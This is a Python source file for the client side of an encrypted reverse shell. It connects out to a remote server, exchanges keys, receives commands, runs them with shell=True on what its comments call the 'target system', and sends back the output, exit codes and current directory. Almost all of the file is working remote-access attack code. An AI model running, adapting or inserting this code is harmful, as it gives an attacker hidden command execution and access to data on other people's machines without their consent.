import socket
import os
import subprocess
from ENCRYPTION import *
from time import sleep


#Injects a shell commands on the target system
def shellInjection(command):
    shellc = command.split()
    try:
        x = subprocess.Popen(shellc, stdout=subprocess.PIPE, shell=True)
        (output, err) = x.communicate()
        x_status = x.wait()
        s = f"{output}"
        exitstatus = f"Command exit status/return code : {x_status}"
        vlist = [s, exitstatus]
        return vlist
    except BaseException:
        f = f"Could not execute {command} on target system"
        exitstatus = "Command exit status ERROR INVALID COMMAND"
        slist = [f, exitstatus]
        return slist

#Client class
class Client:
    #Initialise client / connect to server / exchange keys
    def __init__(self, HOST, PORT, crypt):
        self.serv = socket.socket()
        self.serv.connect((HOST, PORT))
        self.crypt = crypt  #Crypto Object
        self.crypt.getEndpointPubKey(self.serv) #Get server public key and store in Crypto object
        self.crypt.sendEndpointPubKey(self.serv) #Send stored public key to server

    def recvCommand(self):  #receive a command from the server
        data = self.serv.recv(2048)
        if len(data) > 0:
            return self.crypt.Decrypt(data)

    def sendDir(self):  #Send the current directory to the server
        cur_dir = os.getcwd()
        self.serv.send(self.crypt.Encrypt(cur_dir))
        return

    def sendOutput(self, output):   #send output from shell to server
        self.serv.send(self.crypt.Encrypt(output[0]))
        sleep(1)
        self.serv.send(self.crypt.Encrypt(output[1]))
        return
